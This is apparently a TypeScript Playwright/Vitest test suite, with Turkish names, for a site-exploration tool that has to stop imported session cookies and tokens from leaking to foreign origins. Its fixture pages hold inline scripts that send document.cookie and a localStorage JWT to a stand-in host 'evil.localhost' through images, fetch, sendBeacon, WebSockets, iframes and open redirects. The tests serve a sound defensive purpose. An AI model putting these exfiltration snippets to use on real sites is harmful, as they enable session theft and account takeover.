import { createServer, type IncomingMessage, type Server } from 'node:http';
import { readFile, symlink, writeFile } from 'node:fs/promises';
import { execFile } from 'node:child_process';
import { join } from 'node:path';
import { chromium } from '@playwright/test';
import { afterAll, beforeAll, beforeEach, describe, expect, it, type TestContext, vi } from 'vitest';
import type { OturumDurumu } from '../../src/depo/index.js';
import { CredentialLeakBlockedError, kesfetAyrintili, sayfayiYenile, type KesifSonucu } from '../../src/kesif/index.js';
import { iceAlinanOturumMetni } from '../../src/kesif/oturum-dosyasi.js';
import { geciciDizinAc } from '../yardimci/gecici-dizin.js';

/**
 * İçe alınan oturumla keşif (spec 2026-10-13 §1-C): bağlam ilk istekten itibaren kimlikli evrededir
 * (docs/2026-10-12-kimlikli-baglam-cikis-spec.md kuralları). Hedef `app.kobay.localhost`, yabancı
 * `evil.localhost` (aynı sunucu, Host adına göre ayrılır). Sayfalar oturum çerezini, HttpOnly olmayan
 * çerezi ve localStorage jetonunu yabancıya her yoldan göndermeye çalışır; yabancıya hiçbir istek
 * düşmemeli (yönlendirme ayağı hariç: bilinen sınır, yalnız tespit).
 */
const SID = 'SIDDEGERI-91b2c3d4e5f60718';
const OKUNUR = 'OKUNURCEREZ-a1b2c3d4e5f6a7b8';
const JWT = 'JWTDEGERI-0f1e2d3c4b5a6978';
const kati = process.env.KOBAY_TEST_STRICT === '1';
let tarayiciEngeli: unknown;

const yabanciKayit: string[] = [];
const hedefKayit: string[] = [];
let sunucu: Server | undefined;
let hedefUrl = '';
let evilUrl = '';
/** Auth origin (izinli, tam origin) ve aynı ana makinenin başka portu (yabancı); Cookie başlığını kaydeder. */
let authUrl = '';
let authBaskaPortUrl = '';
let ikinci: Server | undefined;
const ikinciKayit: string[] = [];
const KISA = 'ABC123';
const UZUN = 'ABCDEFGH1234';
const AUTHCEREZ = 'AUTHCEREZ-6d5c4b3a29180716';

function hostAdi(istek: IncomingMessage): string {
  return (istek.headers.host ?? '').replace(/:\d+$/, '');
}

function girisli(istek: IncomingMessage): boolean {
  return (istek.headers.cookie ?? '').split(';').some((parca) => parca.trim() === `sid=${SID}`);
}

function sayfa(govde: string, betik = ''): string {
  return `<!doctype html><html><head><script>const EVIL=${JSON.stringify(evilUrl)};`
    + "const sizdir=()=>location.pathname.endsWith('-d')?'yok':encodeURIComponent(document.cookie+'|'+localStorage.getItem('jwt'));"
    + '</script></head>'
    + `<body>${govde}<script>${betik}</script></body></html>`;
}

const SAYFALAR: Record<string, string | (() => string)> = {
  '/': () => sayfa('<h1>Dashboard</h1><a href="/records">Records</a><a href="/settings">Settings</a>'),
  '/records': () => sayfa('<h1>Records</h1><form action="/records" method="post"><label>Name <input name="ad"></label>'
    + '<button type="submit">Save</button></form>'),
  '/settings': () => sayfa('<h1>Settings</h1>'),
  // GET alt kaynak: img, fetch, betik.
  '/p-get': () => sayfa('<h1>Get</h1>', "new Image().src=EVIL+'/img?c='+sizdir();fetch(EVIL+'/fetch?c='+sizdir(),{mode:'no-cors'});"
    + "const s=document.createElement('script');s.src=EVIL+'/s.js?c='+sizdir();document.head.append(s);"),
  // Yazma: POST ve sendBeacon.
  '/p-post': () => sayfa('<h1>Post</h1>', "fetch(EVIL+'/post',{method:'POST',body:sizdir(),mode:'no-cors'});"
    + "navigator.sendBeacon(EVIL+'/beacon',sizdir());"),
  // WebSocket.
  '/p-ws': () => sayfa('<h1>Ws</h1>', "const w=new WebSocket(EVIL.replace(/^http/,'ws')+'/ws?c='+sizdir());"
    + 'w.onopen=()=>w.send(sizdir());'),
  // Belge: iframe, popup, ana çerçeve.
  '/p-belge': () => sayfa('<h1>Docs</h1>', "const i=document.createElement('iframe');i.src=EVIL+'/iframe?c='+sizdir();"
    + "document.body.append(i);window.open(EVIL+'/popup?c='+sizdir());"),
  '/p-ana': () => sayfa('<h1>Main</h1>', "location.href=EVIL+'/ana?c='+sizdir();"),
  // Aynı-site açık yönlendirme (değer taşımadan): kesilemez, uyarıda "via redirect".
  '/p-yonlendir': () => sayfa('<h1>Redirect</h1><img src="/git?to=' + encodeURIComponent(`${evilUrl}/r`) + '">'),
  // Aynı-site açık yönlendirme, ayakta oturum değeri: tespit edilir, keşif durur.
  '/p-sizinti-yonlendir': () => sayfa('<h1>Leak</h1>', "new Image().src='/git?to='+encodeURIComponent(EVIL+'/r?c='+sizdir());"),
  // Codex P1: kısa oturum değeri (6 karakter) güvenilen yönlendirmeyle yabancıya.
  '/p-kisa': () => sayfa('<h1>Short</h1><img src="/git?to=' + encodeURIComponent(`${evilUrl}/?x=${KISA}`) + '">'),
  // Codex P1: auth origin çerezi, güvenilen yönlendirmeyle aynı ana makinenin başka portuna (Cookie başlığında).
  // Üst düzey gezinme: Lax çerez siteler-arası alt kaynakta gitmez, üst düzey GET'te gider.
  '/p-port': () => sayfa('<h1>Port</h1>', `location.href='/git?to=${encodeURIComponent(`${authBaskaPortUrl}/r`)}';`),
  // Codex P1: uygulama oturum değerlerini DOM'a yazar (başlık, düğme, etiket, bağlantı, menü).
  '/p-dom': () => sayfa('<h1 id="b">Panel</h1><nav><a id="m" href="/settings">x</a></nav><form action="/records">'
    + '<label>Tok <input name="t" id="i"></label><button id="d">y</button></form>',
  "const j=localStorage.getItem('jwt'),c=document.cookie;document.title='Hello '+j;"
    + "document.getElementById('b').textContent='Panel '+c;document.getElementById('d').textContent='Use '+j;"
    + "document.getElementById('m').textContent='Menu '+j;document.getElementById('i').placeholder=j;"),
  // Codex 2. tur: kısa değer base64 ile kodlanıp güvenilen yönlendirmeyle yabancıya (`/collect/QUJDMTIz`).
  // Codex 3. tur: yenileme sırasında oturum değerini taşıyan yönlendirme (`/giris/<JWT>`).
  '/p-jeton-yonlen': () => '',
  '/p-sw': () => '<!doctype html><html><head><script>navigator.serviceWorker?.register("/sw.js").catch(() => undefined);</script>'
    + '<script src="/yavas.js"></script></head><body><h1>SW</h1></body></html>',
  '/p-b64': () => sayfa('<h1>B64</h1><img src="/git?to=' + encodeURIComponent(`${evilUrl}/collect/${Buffer.from(UZUN).toString('base64')}`) + '">'),
  // Opus 2. kabul R2: kısa oturum değerleri (`true`, `dark`) sıradan bir pikselde geçer; yanlış alarm olmamalı.
  '/p-piksel': () => sayfa('<h1>Pixel</h1><img src="/git?to=' + encodeURIComponent(`${evilUrl}/p?lazy=true&theme=dark`) + '">', "new Image().src=EVIL+'/q?lazy=true';"),
  // Opus 2. kabul R1: parola `admin`, sayfada /admin bağlantıları; harita yapısı bozulmamalı.
  '/admin': () => sayfa('<h1>Admin panel</h1><nav><a href="/admin/users">admin users</a></nav><a href="/admin">admin</a>'
    + '<form action="/admin/save" method="post"><label>Role <input name="admin_role"></label><button>Save admin</button></form>'),
  // `--login` yolu: sayfa parolayı ekrana basar; haritaya girmemeli.
  '/p-parola': () => sayfa('<h1>Welcome kobay-parola-123</h1><button>Reset kobay-parola-123</button>'),
  // Kardeş ana makine (aynı site, başka ana makine): içe alınan oturumda izinli DEĞİL.
  '/p-api': () => sayfa('<h1>Api</h1>', "fetch(EVIL.replace('evil.localhost','api.kobay.localhost')+'/api',{mode:'no-cors'});"),
};

beforeAll(async () => {
  try {
    const tarayici = await chromium.launch({ headless: true });
    await tarayici.close();
  } catch (hata) {
    tarayiciEngeli = hata;
  }
  if (tarayiciEngeli !== undefined) return;
  sunucu = createServer((istek, yanit) => {
    const adres = new URL(istek.url ?? '/', 'http://x');
    const host = hostAdi(istek);
    if (host === 'api.kobay.localhost') {
      yabanciKayit.push(`API ${istek.url ?? ''}`);
      yanit.writeHead(200);
      yanit.end('api');
      return;
    }
    if (host === 'evil.localhost') {
      let govde = '';
      istek.on('data', (parca: Buffer) => { govde += parca.toString('utf8'); });
      istek.on('end', () => {
        yabanciKayit.push(`${istek.method ?? ''} ${istek.url ?? ''} ${govde}`);
        yanit.writeHead(200, { 'content-type': 'text/html' });
        yanit.end('<!doctype html><html><body>evil</body></html>');
      });
      return;
    }
    hedefKayit.push(`${adres.pathname}${adres.search}`);
    // Service worker kaydeden sayfa: `/yavas.js` DOMContentLoaded'ı geciktirir ki kayıt denemesi sayfa
    // okunmadan gerçekleşsin; worker açıksa tarayıcı `/sw.js`'i ister.
    if (adres.pathname === '/sw.js') {
      yanit.writeHead(200, { 'content-type': 'text/javascript' });
      yanit.end('self.addEventListener("fetch", () => {});');
      return;
    }
    if (adres.pathname === '/yavas.js') {
      setTimeout(() => { yanit.writeHead(200, { 'content-type': 'text/javascript' }); yanit.end('/* yavaş */'); }, 800);
      return;
    }
    if (adres.pathname === '/p-jeton-yonlen') {
      yanit.writeHead(302, { location: `/giris/${JWT}` });
      yanit.end();
      return;
    }
    if (adres.pathname === '/git') {
      yanit.writeHead(302, { location: adres.searchParams.get('to') ?? '/' });
      yanit.end();
      return;
    }
    if (adres.pathname === '/giris' && istek.method === 'POST') {
      yanit.writeHead(302, { location: '/', 'set-cookie': `sid=${SID}; Path=/; HttpOnly` });
      yanit.end();
      return;
    }
    if (adres.pathname === '/giris') {
      yanit.writeHead(200, { 'content-type': 'text/html' });
      yanit.end('<!doctype html><html><body><h1>Sign in</h1><form action="/giris" method="post">'
        + '<input name="k"><input type="password" name="p"><button type="submit">Log in</button></form></body></html>');
      return;
    }
    if (!girisli(istek)) {
      yanit.writeHead(302, { location: '/giris' });
      yanit.end();
      return;
    }
    // `<yol>-d`: aynı sayfa, değer taşımayan sürüm (`sizdir` 'yok' döner).
    const icerik = SAYFALAR[adres.pathname] ?? SAYFALAR[adres.pathname.replace(/-d$/, '')];
    yanit.writeHead(icerik === undefined ? 404 : 200, { 'content-type': 'text/html' });
    yanit.end(typeof icerik === 'function' ? icerik() : icerik ?? 'yok');
  });
  sunucu.on('upgrade', (istek, soket) => {
    if (hostAdi(istek) === 'evil.localhost') yabanciKayit.push(`UPGRADE ${istek.url ?? ''}`);
    soket.destroy();
  });
  const port = await new Promise<number>((coz) => {
    sunucu?.listen(0, '127.0.0.1', () => {
      const a = sunucu?.address();
      coz(typeof a === 'object' && a !== null ? a.port : 0);
    });
  });
  hedefUrl = `http://app.kobay.localhost:${port}`;
  evilUrl = `http://evil.localhost:${port}`;
  authUrl = `http://auth.localhost:${port}`;
  ikinci = createServer((istek, yanit) => {
    ikinciKayit.push(`${istek.url ?? ''} cookie=${istek.headers.cookie ?? ''}`);
    yanit.writeHead(200);
    yanit.end('x');
  });
  const port2 = await new Promise<number>((coz) => {
    ikinci?.listen(0, '127.0.0.1', () => {
      const a = ikinci?.address();
      coz(typeof a === 'object' && a !== null ? a.port : 0);
    });
  });
  authBaskaPortUrl = `http://auth.localhost:${port2}`;
});

afterAll(async () => {
  for (const s of [sunucu, ikinci]) {
    if (s !== undefined) await new Promise((coz) => { s.closeAllConnections(); s.close(coz); });
  }
});

let stderrCasusu: ReturnType<typeof vi.spyOn<typeof process.stderr, 'write'>> | undefined;

beforeEach(() => {
  yabanciKayit.length = 0;
  hedefKayit.length = 0;
  stderrCasusu = vi.spyOn(process.stderr, 'write').mockImplementation(() => true);
  return () => {
    stderrCasusu?.mockRestore();
    stderrCasusu = undefined;
  };
});

function uyarilar(): string[] {
  return (stderrCasusu?.mock.calls ?? []).map(([metin]) => String(metin)).filter((metin) => metin.startsWith('[kobay] Warning:'));
}

function tarayiciMumkun(context: TestContext): boolean {
  if (!tarayiciEngeli) return true;
  const ozet = String(tarayiciEngeli).split('\n')[0] ?? '';
  if (kati) throw new Error(`KOBAY_TEST_STRICT=1: Gerçek Chromium atlanamaz: ${ozet}`);
  context.skip(`Gerçek Chromium bu ortamda engelli: ${ozet}`);
  return false;
}

function oturum(sid = SID): OturumDurumu {
  return {
    cookies: [
      { name: 'sid', value: sid, domain: 'app.kobay.localhost', path: '/', expires: -1, httpOnly: true, secure: false, sameSite: 'Lax' },
      { name: 'okunur', value: OKUNUR, domain: 'app.kobay.localhost', path: '/', expires: -1, httpOnly: false, secure: false, sameSite: 'Lax' },
    ],
    origins: [{ origin: hedefUrl, localStorage: [{ name: 'jwt', value: JWT }] }],
  };
}

/** Değerlerden biri (ham ya da URL kodlu) yabancı kayıtta geçiyor mu? */
function degerGitti(): boolean {
  return yabanciKayit.some((satir) => [SID, OKUNUR, JWT].some((deger) => satir.includes(deger)
    || satir.includes(encodeURIComponent(deger))));
}

async function durul(): Promise<void> {
  await new Promise((coz) => { setTimeout(coz, 500); });
}

async function iceAlinanKesif(yol: string, ek: { oturum?: OturumDurumu; derinlik?: number; maxSayfa?: number; authOrigins?: string[] } = {}): Promise<{
  sonuc: KesifSonucu;
  storage: string;
  onceki: string;
}> {
  const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
  const durum = ek.oturum ?? oturum();
  const onceki = iceAlinanOturumMetni(durum);
  await writeFile(storage, onceki, { mode: 0o600 });
  const sonuc = await kesfetAyrintili({
    baseUrl: `${hedefUrl}${yol}`,
    storageStateYolu: storage,
    oturum: durum,
    ...(ek.authOrigins === undefined ? {} : { authOrigins: ek.authOrigins }),
    siteHaritasi: false,
    derinlik: ek.derinlik ?? 0,
    maxSayfa: ek.maxSayfa ?? 1,
    sayfaZamanAsimiMs: 5_000,
  });
  return { sonuc, storage, onceki };
}

describe('içe alınan oturumla keşif', () => {
  it('girişsiz açılmayan sayfaları gezer; harita loggedIn: true, sessionSource: imported; dosyaya yazılmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { sonuc, storage, onceki } = await iceAlinanKesif('/', { derinlik: 1, maxSayfa: 5 });
    expect(sonuc.harita).toMatchObject({ loggedIn: true, sessionSource: 'imported' });
    const yollar = sonuc.harita.pages.map((s) => new URL(s.url).pathname).sort();
    expect(yollar).toEqual(['/', '/records', '/settings']);
    expect(sonuc.harita.pages.some((s) => s.requiresLogin === true)).toBe(false);
    expect(sonuc.harita.pages.find((s) => new URL(s.url).pathname === '/records')?.forms[0]?.fields[0]?.name).toBe('ad');
    // Giriş formuna hiç gidilmedi; dosya içe alındığı gibi kaldı.
    expect(hedefKayit.filter((satir) => satir.startsWith('/giris'))).toEqual([]);
    expect(await readFile(storage, 'utf8')).toBe(onceki);
    expect(JSON.stringify(sonuc.harita)).not.toContain(SID);
  });

  it('düşmüş oturum: girişe yönlenen sayfalar requiresLogin olarak görünür', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { sonuc } = await iceAlinanKesif('/', { oturum: oturum('ESKIDEGER-0000000000000000'), derinlik: 1, maxSayfa: 5 });
    expect(sonuc.harita.sessionSource).toBe('imported');
    expect(sonuc.harita.pages.some((s) => s.requiresLogin === true)).toBe(true);
  });

  const YOLLAR: Array<[string, string]> = [
    ['GET alt kaynak (img, fetch, betik)', '/p-get'],
    ['yazma (POST, sendBeacon)', '/p-post'],
    ['WebSocket', '/p-ws'],
    ['belge (iframe, popup)', '/p-belge'],
    ['ana çerçeve yönlenmesi', '/p-ana'],
  ];

  it.each(YOLLAR)('%s, oturum değeri taşımadan: yabancıya hiçbir istek düşmez, keşif sürer, uyarı yazılır', async (_ad, yol, context) => {
    if (!tarayiciMumkun(context)) return;
    const { sonuc } = await iceAlinanKesif(`${yol}-d`);
    expect(sonuc.harita.sessionSource).toBe('imported');
    await durul();
    expect(yabanciKayit).toEqual([]);
    const uyari = uyarilar().find((metin) => metin.includes('with the imported session'));
    expect(uyari).toContain(evilUrl);
    expect(uyari).toContain('to protect the session');
  });

  it.each(YOLLAR)('%s, çerez/localStorage değeriyle: yabancıya düşmez, keşif sızıntı hatasıyla durur, değer yazılmaz', async (_ad, yol, context) => {
    if (!tarayiciMumkun(context)) return;
    let hata: unknown;
    try {
      await iceAlinanKesif(yol);
    } catch (yakalanan: unknown) {
      hata = yakalanan;
    }
    expect(hata).toBeInstanceOf(CredentialLeakBlockedError);
    const mesaj = (hata as Error).message;
    expect(mesaj).toContain('value from the imported session');
    // Neden bulunabilsin: eşleşen çerez/anahtar ADI yazılır (değer değil).
    expect(mesaj).toMatch(/cookie okunur|localStorage jwt/);
    await durul();
    expect(yabanciKayit).toEqual([]);
    expect(degerGitti()).toBe(false);
    for (const deger of [SID, OKUNUR, JWT]) {
      expect(mesaj).not.toContain(deger);
      expect(uyarilar().join('\n')).not.toContain(deger);
    }
  });

  it('aynı-site açık yönlendirme (değer taşımadan) yabancıya ulaşır; uyarıda "via redirect" diye ayrı sayılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { sonuc } = await iceAlinanKesif('/p-yonlendir');
    expect(sonuc.harita.loggedIn).toBe(true);
    // Dürüstlük: Chromium ikinci ayağı route'a uğratmaz; istek yabancıya ULAŞIR (bilinen sınır).
    await expect.poll(() => yabanciKayit.some((satir) => satir.startsWith('GET /r ')), { timeout: 3_000 }).toBe(true);
    // Tarayıcı oturum çerezini yabancı alana eklemez.
    expect(degerGitti()).toBe(false);
    expect(uyarilar().join('\n')).toMatch(new RegExp(`\\d+ requests? reached ${evilUrl} via redirect with the imported session`));
  });

  it('yönlendirme ayağı oturum değeri taşıyorsa tespit edilir, keşif durur; hata değeri göstermez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    let hata: unknown;
    try {
      await iceAlinanKesif('/p-sizinti-yonlendir');
    } catch (yakalanan: unknown) {
      hata = yakalanan;
    }
    expect(hata).toBeInstanceOf(CredentialLeakBlockedError);
    const mesaj = (hata as Error).message;
    expect(mesaj).toContain('value from the imported session');
    expect(mesaj).toContain('evil.localhost');
    for (const deger of [SID, OKUNUR, JWT]) expect(mesaj).not.toContain(deger);
  });
});

async function sizintiHatasi(is: () => Promise<unknown>): Promise<string> {
  let hata: unknown;
  try {
    await is();
  } catch (yakalanan: unknown) {
    hata = yakalanan;
  }
  expect(hata).toBeInstanceOf(CredentialLeakBlockedError);
  return (hata as Error).message;
}

describe('Codex sol karşıt denetim (P1) kapanışları', () => {
  it('kısa (6 karakter) oturum değeri sır sayılmaz: güvenilen yönlendirmeyle yabancıya giderse keşif sürer, yalnız "via redirect" uyarısı', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const d = oturum();
    d.cookies.push({ ...d.cookies[0]!, name: 'kisa', value: KISA });
    const { sonuc } = await iceAlinanKesif('/p-kisa', { oturum: d });
    expect(sonuc.harita.sessionSource).toBe('imported');
    await expect.poll(() => uyarilar().join('\n'), { timeout: 3_000 }).toMatch(/via redirect with the imported session/);
  });

  it('Opus R2: sidebar_state=true, theme=dark içe alınmışken `?lazy=true` pikseli yanlış alarm vermez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const d = oturum();
    d.cookies.push({ ...d.cookies[0]!, name: 'sidebar_state', value: 'true' }, { ...d.cookies[0]!, name: 'theme', value: 'dark' });
    const { sonuc } = await iceAlinanKesif('/p-piksel', { oturum: d });
    expect(sonuc.harita.loggedIn).toBe(true);
  });

  it('base64 kodlu oturum değeri (/collect/<base64>) yönlendirme ayağında tespit edilir, keşif durur; mesaj çerez ADINI söyler', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const d = oturum();
    d.cookies.push({ ...d.cookies[0]!, name: 'uzun', value: UZUN });
    const mesaj = await sizintiHatasi(() => iceAlinanKesif('/p-b64', { oturum: d }));
    expect(mesaj).toContain('evil.localhost');
    expect(mesaj).toContain('cookie uzun');
    expect(mesaj).not.toContain(Buffer.from(UZUN).toString('base64').replace(/=+$/, ''));
    expect(mesaj).not.toContain(UZUN);
  });

  it('test refresh içe alınan oturumla korumalı: yabancıya oturum değeri → sızıntı hatası, yabancıya hiçbir şey düşmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    await writeFile(storage, iceAlinanOturumMetni(oturum()));
    const mesaj = await sizintiHatasi(() => sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/p-get', storageStateYolu: storage, oturum: oturum() }));
    expect(mesaj).toContain('value from the imported session');
    await durul();
    expect(yabanciKayit).toEqual([]);
    for (const deger of [SID, OKUNUR, JWT]) expect(mesaj).not.toContain(deger);
  });

  it('test refresh: oturum değeri taşımayan yabancı istek de düşmez, yenileme sürer', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    await writeFile(storage, iceAlinanOturumMetni(oturum()));
    const ozet = await sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/p-get-d', storageStateYolu: storage, oturum: oturum() });
    expect(new URL(ozet.url).pathname).toBe('/p-get-d');
    await durul();
    expect(yabanciKayit).toEqual([]);
  });

  it('test refresh içe alınan oturumla service worker kurmaz (sw.js hiç istenmez)', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    await writeFile(storage, iceAlinanOturumMetni(oturum()));
    await sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/p-sw', storageStateYolu: storage, oturum: oturum() });
    expect(hedefKayit).toContain('/yavas.js');
    expect(hedefKayit).not.toContain('/sw.js');
  });

  it('test refresh çalışma hatası (oturum değeri taşıyan yola yönlenme) maskeli', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    await writeFile(storage, iceAlinanOturumMetni(oturum()));
    let hata: unknown;
    try {
      await sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/p-jeton-yonlen', storageStateYolu: storage, oturum: oturum() });
    } catch (yakalanan: unknown) {
      hata = yakalanan;
    }
    expect((hata as Error).message).toContain('could not be refreshed');
    expect((hata as Error).message).toContain('[redacted]');
    expect((hata as Error).message).not.toContain(JWT);
  });

  it('test refresh: DOM\'a yazılan oturum değerleri yenilenen sayfa özetinde maskeli', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    await writeFile(storage, iceAlinanOturumMetni(oturum()));
    const ozet = await sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/p-dom', storageStateYolu: storage, oturum: oturum() });
    const metin = JSON.stringify(ozet);
    for (const deger of [SID, OKUNUR, JWT]) expect(metin).not.toContain(deger);
    expect(metin).toContain('[redacted]');
  });

  it('test refresh doğrulanmış oturum nesnesini kullanır: diskteki dosya arada değişse de (B) tarayıcıya A gider', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    // Diskte düşmüş oturum B; çağıran A'yı doğrulamış.
    await writeFile(storage, iceAlinanOturumMetni(oturum('ESKIDEGER-0000000000000000')));
    const ozet = await sayfayiYenile({ baseUrl: `${hedefUrl}/`, url: '/records', storageStateYolu: storage, oturum: oturum() });
    expect(new URL(ozet.url).pathname).toBe('/records');
  });

  it('auth origin çerezi aynı ana makinenin başka portuna yönlendirilirse Cookie başlığından tespit edilir', async (context) => {
    if (!tarayiciMumkun(context)) return;
    ikinciKayit.length = 0;
    const d = oturum();
    d.cookies.push({ ...d.cookies[0]!, name: 'auth', value: AUTHCEREZ, domain: 'auth.localhost' });
    const mesaj = await sizintiHatasi(() => iceAlinanKesif('/p-port', { oturum: d, authOrigins: [authUrl] }));
    // Dürüstlük: yönlendirme ayağı kesilemez, çerez karşıya ULAŞTI; kobay yalnız tespit edip durur.
    expect(ikinciKayit.some((satir) => satir.includes(AUTHCEREZ))).toBe(true);
    expect(mesaj).toContain(authBaskaPortUrl);
    expect(mesaj).not.toContain(AUTHCEREZ);
  });

  it('DOM\'a yazılan oturum değerleri haritaya girmez (başlık, düğme, etiket, menü)', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const { sonuc } = await iceAlinanKesif('/p-dom');
    const metin = JSON.stringify(sonuc.harita);
    for (const deger of [SID, OKUNUR, JWT]) expect(metin).not.toContain(deger);
    expect(metin).toContain('[redacted]');
  });

  it('kardeş ana makine (api.kobay.localhost) içe alınan oturumla izinli değil: istek düşmez, uyarı yazılır', async (context) => {
    if (!tarayiciMumkun(context)) return;
    await iceAlinanKesif('/p-api');
    await durul();
    expect(yabanciKayit).toEqual([]);
    expect(uyarilar().join('\n')).toContain('api.kobay.localhost');
  });
});

describe('Opus kör kabul: kurulum hatası ve sembolik bağ', () => {
  it('Chromium\'un reddettiği (şemadan geçen) oturum CLI explore\'u asmaz: süreç sonlu sürede çıkar, değer yazılmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const proje = await geciciDizinAc('kobay-ice-alinan-');
    const cli = (...argumanlar: string[]): Promise<{ kod: number | null; cikti: string; olduruldu: boolean }> => new Promise((coz) => {
      execFile(process.execPath, ['--import', 'tsx', join(process.cwd(), 'src/cli/index.ts'), '--cwd', proje, ...argumanlar],
        { timeout: 45_000 }, (hata, stdout, stderr) => {
          const h = hata as { code?: number; killed?: boolean } | null;
          coz({ kod: h === null ? 0 : h.code ?? null, cikti: `${stdout}${stderr}`, olduruldu: h?.killed === true });
        });
    });
    // Ayrı CLI süreci tarayıcıdan önce hedefi Node `fetch` ile yoklar; Windows'un çözücüsü
    // `*.localhost` alt adlarını çözmez (Chromium kendi çözer), yoklama "not reachable" der ve
    // çerez denetimine hiç varılmaz. Bu test yalnız Chromium'un çerez reddini sınadığından
    // hedef her platformda çözülen 127.0.0.1'dir; sunucu tanımadığı Host'u hedef sayar.
    const yerelUrl = hedefUrl.replace('app.kobay.localhost', '127.0.0.1');
    expect((await cli('project', 'create', '--url', `${yerelUrl}/`, '--brain', 'sahte')).kod).toBe(0);
    // Şema adı/değeri serbest bırakır; Chromium `Storage.setCookies`te reddeder (newContext hatası).
    const d = oturum();
    d.cookies = d.cookies.map((c) => ({ ...c, domain: '127.0.0.1' }));
    d.origins = d.origins.map((o) => ({ ...o, origin: yerelUrl }));
    d.cookies[0] = { ...d.cookies[0]!, name: 'a;b=c', value: `${SID}\u0000x` };
    await writeFile(join(proje, '.kobay', 'storageState.json'), iceAlinanOturumMetni(d));
    const sonuc = await cli('explore');
    expect(sonuc.olduruldu).toBe(false);
    expect(sonuc.kod).not.toBe(0);
    expect(sonuc.cikti).toContain('Invalid cookie fields');
    for (const deger of [SID, OKUNUR, JWT]) expect(sonuc.cikti).not.toContain(deger);
  }, 90_000);

  it('kimliksiz keşif sembolik bağ storageState\'in hedefini ezmez, reddeder', async (context) => {
    if (!tarayiciMumkun(context)) return;
    // Windows'ta sembolik bağ ayrıcalık ister.
    if (process.platform === 'win32') return;
    const dizin = await geciciDizinAc('kobay-ice-alinan-');
    const hedef = join(dizin, 'kullanici-dosyasi.txt');
    await writeFile(hedef, 'degerli icerik');
    const bag = join(dizin, 'storageState.json');
    await symlink(hedef, bag);
    await expect(kesfetAyrintili({
      baseUrl: `${hedefUrl}/giris`, storageStateYolu: bag, siteHaritasi: false, derinlik: 0, maxSayfa: 1, sayfaZamanAsimiMs: 5_000,
    })).rejects.toThrow(/symbolic link/);
    expect(await readFile(hedef, 'utf8')).toBe('degerli icerik');
  });
});

describe('giriş yolları: sessionSource', () => {
  it('Opus R1: kısa parola (`admin`) haritayı değiştirmez: /admin bağlantıları, action ve alan adı aynen', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = (await kesfetAyrintili({
      baseUrl: `${hedefUrl}/admin`,
      loginUrl: `${hedefUrl}/giris`,
      kimlik: { username: 'demo', password: 'admin', origin: hedefUrl },
      storageStateYolu: join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json'),
      siteHaritasi: false, derinlik: 0, maxSayfa: 3, sayfaZamanAsimiMs: 5_000,
    })).harita;
    const sayfaKaydi = harita.pages.find((s) => new URL(s.url).pathname === '/admin');
    expect(sayfaKaydi?.links).toEqual(expect.arrayContaining([`${hedefUrl}/admin/users`, `${hedefUrl}/admin`]));
    expect(sayfaKaydi?.forms[0]?.action).toBe('/admin/save');
    expect(sayfaKaydi?.forms[0]?.fields[0]?.name).toBe('admin_role');
    expect(sayfaKaydi?.headings).toContain('Admin panel');
    expect(JSON.stringify(harita)).not.toContain('redacted');
  });

  it('--login yolu: sayfanın ekrana bastığı parola haritaya girmez', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const harita = (await kesfetAyrintili({
      baseUrl: `${hedefUrl}/p-parola`,
      loginUrl: `${hedefUrl}/giris`,
      kimlik: { username: 'demo', password: 'kobay-parola-123', origin: hedefUrl },
      storageStateYolu: join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json'),
      siteHaritasi: false, derinlik: 0, maxSayfa: 2, sayfaZamanAsimiMs: 5_000,
    })).harita;
    const metin = JSON.stringify(harita);
    expect(metin).toContain('Welcome [redacted]');
    expect(metin).not.toContain('kobay-parola-123');
  });

  it('--login yolu sessionSource: login yazar; kimliksiz keşif yazmaz', async (context) => {
    if (!tarayiciMumkun(context)) return;
    const storage = join(await geciciDizinAc('kobay-ice-alinan-'), 'storageState.json');
    const girisli = await kesfetAyrintili({
      baseUrl: `${hedefUrl}/`,
      loginUrl: `${hedefUrl}/giris`,
      kimlik: { username: 'demo', password: 'kobay-parola-123', origin: hedefUrl },
      storageStateYolu: storage,
      siteHaritasi: false,
      derinlik: 0,
      maxSayfa: 2,
      sayfaZamanAsimiMs: 5_000,
    });
    expect(girisli.harita).toMatchObject({ loggedIn: true, sessionSource: 'login' });
    // Eski yol: giriş akışı oturumu kendisi yazar, işaretsiz.
    expect(JSON.parse(await readFile(storage, 'utf8'))).not.toHaveProperty('kobay');
    const girissiz = await kesfetAyrintili({
      baseUrl: `${hedefUrl}/`, storageStateYolu: storage, siteHaritasi: false, derinlik: 0, maxSayfa: 1, sayfaZamanAsimiMs: 5_000,
    });
    expect(girissiz.harita.loggedIn).toBe(false);
    expect(girissiz.harita).not.toHaveProperty('sessionSource');
  });
});
